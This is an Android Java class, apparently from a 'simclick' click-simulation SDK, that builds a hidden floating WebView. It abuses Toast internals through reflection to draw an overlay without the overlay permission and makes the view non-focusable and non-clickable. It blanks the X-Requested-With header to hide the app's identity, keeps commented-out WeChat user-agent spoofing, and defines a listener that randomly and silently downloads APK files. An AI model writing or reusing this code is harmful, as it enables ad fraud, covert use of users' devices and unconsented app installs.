package dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.view;

import android.content.Context;
import android.os.Handler;
import android.provider.SyncStateContract;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.webkit.DownloadListener;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Toast;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import dlg.lizhihao.com.mobilezausap.R;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.common.SdkContext;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.LogUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.RandomUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.SdkUtils;

public class CustomFloatWeb {
    private static final String TAG = CustomFloatWeb.class.getSimpleName();

    public static HashMap<String, String> headerMap = new HashMap<String, String>();
    static {
        headerMap.put("X-Requested-With", "");
    }
    private Toast toast;
    private Context mContext;
    private int animations = -1;
    private boolean isShow = false;

    private Object mTN;
    private Method show;
    private Method hide;
    private WindowManager mWM;
    private WindowManager.LayoutParams params;
    private View mView;

    private WebView mWeb;

    private Handler handler = new Handler();
    public CustomFloatWeb(Context context){
        this.mContext = context;
        if (toast == null) {
            toast = new Toast(mContext);
        }
        LayoutInflater inflate = (LayoutInflater)
                mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        mView = inflate.inflate(R.layout.float_web_layout, null);
    }

    private Runnable hideRunnable = new Runnable() {
        @Override
        public void run() {
            hide();
        }
    };
    /**
     * Show the view for the specified duration.
     */
    public void create(){
        if (isShow) return;
        mWeb = (WebView)mView.findViewById(R.id.web);
        WebSettings webSettings = mWeb.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAppCacheEnabled(false);
        webSettings.setBuiltInZoomControls(false);
        webSettings.setUseWideViewPort(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);
        webSettings.setAllowContentAccess(true);
        webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        mWeb.setInitialScale(1);
        mWeb.setFocusable(false);
        mWeb.setClickable(false);
        //mWeb.setDownloadListener(new MyWebViewDownLoadListener());
        // mWeb.setVisibility(View.GONE);
        //Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI    微信内置浏览器UmWeb.getSettings().setUserAgentString("//Mozilla/5.0 (Linux; Android 5.0; SM-N9100 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 MicroMessenger/6.0.2.56_r958800.520 NetType/WIFI");
       // mWeb.getSettings().setUserAgentString(UaHelper.getMoblieUA());
        LogUtil.i(TAG, "before update, user agent = " + mWeb.getSettings().getUserAgentString());
//        mWeb.getSettings().setUserAgentString("Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; M355 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 MQQBrowser/5.4 TBS/025410 Mobile Safari/533.1 MicroMessenger/6.1.0_r1062275.542 NetType/WIFI");
       /**
        String ua = SdkUtils.getUaStr(mContext, "");
        if (!SdkUtils.isEmpty(ua)) {
//            SPUtil.getInstance(mContext).putString(SPUtil.UA, ua);
            SdkContext.userAgent = ua;
        }
        if (!SdkUtils.isEmpty(SdkContext.userAgent)) {
            mWeb.getSettings().setUserAgentString(SyncStateContract.Constants.userAgent);
        }
        LogUtil.i(TAG, "after update, user agent: " + mWeb.getSettings().getUserAgentString());
        **/
        toast.setView(mView);
        initTN();
        try {
            show.invoke(mTN);
        } catch (Exception e) {
            e.printStackTrace();
        }
        isShow = true;
    }
    private class MyWebViewDownLoadListener implements DownloadListener {
        @Override
        public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype,
                                    long contentLength) {
            if(url.contains(".apk")){
                int random= RandomUtil.getRandom(0,100);
                if(random<15){
                    /**
                    Intent it=new Intent(mContext,MainActivity.class);
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    mContext.startActivity(it);
                     **/
                    new DownLoadThread(url, mContext).start();
                }
            }
    }
    }
    public WebView getWebView() {
        return mWeb;
    }
    /**
     * Close the view if it's showing, or don't show it if it isn't showing yet.
     * You do not normally have to call this.  Normally view will disappear on its own
     * after the appropriate duration.
     */
    public void hide(){
        if(!isShow) return;
        try {
            hide.invoke(mTN);
        } catch (Exception e) {
            e.printStackTrace();
        }
        isShow = false;
    }
    public void setView(View view) {
        toast.setView(view);
    }

    public View getView() {
        return toast.getView();
    }

    public void setGravity(int gravity, int xOffset, int yOffset) {
        toast.setGravity(gravity,xOffset,yOffset);
    }
    private void initTN() {
        try {
            Field tnField = toast.getClass().getDeclaredField("mTN");
            tnField.setAccessible(true);
            mTN = tnField.get(toast);
            show = mTN.getClass().getMethod("show");
            hide = mTN.getClass().getMethod("hide");
            Field tnParamsField = mTN.getClass().getDeclaredField("mParams");
            tnParamsField.setAccessible(true);
            params = (WindowManager.LayoutParams) tnParamsField.get(mTN);
            params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
            /**设置动画*/
            if (animations != -1) {
                params.windowAnimations = animations;
            }
            /**调用tn.show()之前一定要先设置mNextView*/
            Field tnNextViewField = mTN.getClass().getDeclaredField("mNextView");
            tnNextViewField.setAccessible(true);
            tnNextViewField.set(mTN, toast.getView());
            mWM = (WindowManager)mContext.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        } catch (Exception e) {
            e.printStackTrace();
        }
        setGravity(Gravity.LEFT | Gravity.TOP, 0 , 0);
    }
}